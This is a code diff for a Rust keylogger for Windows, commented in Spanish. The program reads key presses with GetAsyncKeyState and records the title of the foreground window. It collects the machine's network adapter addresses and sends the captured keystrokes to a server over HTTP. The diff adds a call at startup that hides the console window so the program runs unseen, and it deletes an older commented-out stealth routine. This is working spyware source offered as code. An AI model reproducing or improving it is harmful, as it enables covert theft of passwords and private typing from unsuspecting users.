@@ -11,9 +11,10 @@ use bindings::Windows::Win32::{
     IpHelper::{GetAdaptersInfo, IP_ADAPTER_INFO},
     KeyboardAndMouseInput::{GetAsyncKeyState, GetKeyboardLayout},
     ProcessStatus::K32GetProcessImageFileNameW,
-    SystemServices::{OpenProcess, PROCESS_ACCESS_RIGHTS, PWSTR},
+    SystemServices::{GetConsoleWindow, OpenProcess, PROCESS_ACCESS_RIGHTS, PWSTR},
     WindowsAndMessaging::{
-        GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW, GetWindowThreadProcessId, HWND,
+        GetForegroundWindow, GetWindowTextLengthW, GetWindowTextW, GetWindowThreadProcessId,
+        ShowWindow, HWND, SHOW_WINDOW_CMD,
     },
     WindowsProgramming::CloseHandle,
 };
@@ -287,20 +288,20 @@ fn mac_addresses() -> Vec<[i8; MAX_NETWORK_ADAPTERS]> {
     // se obtiene la cantidad de adaptadores en la computadora
     let mut network_adapters_size =
         (std::mem::size_of::<IP_ADAPTER_INFO>() * MAX_NETWORK_ADAPTERS) as u32;
-    // el arreglo se llena con los adaptadores de red de la 
+    // el arreglo se llena con los adaptadores de red de la
     // computadora
     unsafe { GetAdaptersInfo(network_adapters.as_mut_ptr(), &mut network_adapters_size) };
     // se devuelve las direcciones mac de los adaptadores de red de la computadora
     network_adapters
         .iter()
         .filter_map(|adapter| {
-            // se determina si la dirección mac del adaptador es difernte 
+            // se determina si la dirección mac del adaptador es difernte
             // al predeterminado
-            // recordar que el arreglo se inicializó con 16 elementos que por 
+            // recordar que el arreglo se inicializó con 16 elementos que por
             // predeterminado
             // tienen en la dirección mac puros ceros
             let has_address = !adapter.Address.iter().all(|address| *address == 0);
-            // si no está lleno de ceros (osea hay una dirección mac) 
+            // si no está lleno de ceros (osea hay una dirección mac)
             // entonces retornar un Some para la filtración
             has_address.then(|| adapter.IpAddressList.IpAddress.String)
         })
@@ -332,7 +333,7 @@ async fn send_server_key_presses_thread(rx: Receiver<KeyPressInfo>) {
     let retry_response_duration = Duration::from_secs(10);
     // se inicializa un cliente http
     let http_client = reqwest::Client::new();
-    // loop principal del hilo 2 para el envio de las teclas 
+    // loop principal del hilo 2 para el envio de las teclas
     // al servidor
     loop {
         // pausar el hilo hasta el tiempo determinado para
@@ -421,6 +422,8 @@ fn capture_client_keys(
 
 #[tokio::main]
 async fn main() {
+    // ocultar la consola
+    unsafe { ShowWindow(GetConsoleWindow(), SHOW_WINDOW_CMD::SW_HIDE) };
     // se inicializa los canales asíncronos para comunicar las teclas presionadas
     // al hilo que los envia al servidor
     let (tx, rx) = mpsc::channel::<KeyPressInfo>();
@@ -457,17 +460,3 @@ async fn main() {
         std::thread::sleep(key_detection_duration);
     }
 }
-
-// fn hide_window() {
-//     let mut stealth: winapi::shared::windef::HWND;
-//     unsafe {
-//         winapi::um::consoleapi::AllocConsole();
-//         stealth = winapi::um::winuser::FindWindowA(
-//             std::ffi::CString::new("ConsoleWindowClass")
-//                 .unwrap()
-//                 .as_ptr(),
-//             std::ptr::null(),
-//         );
-//         winapi::um::winuser::ShowWindow(stealth, 0);
-//     }
-// }
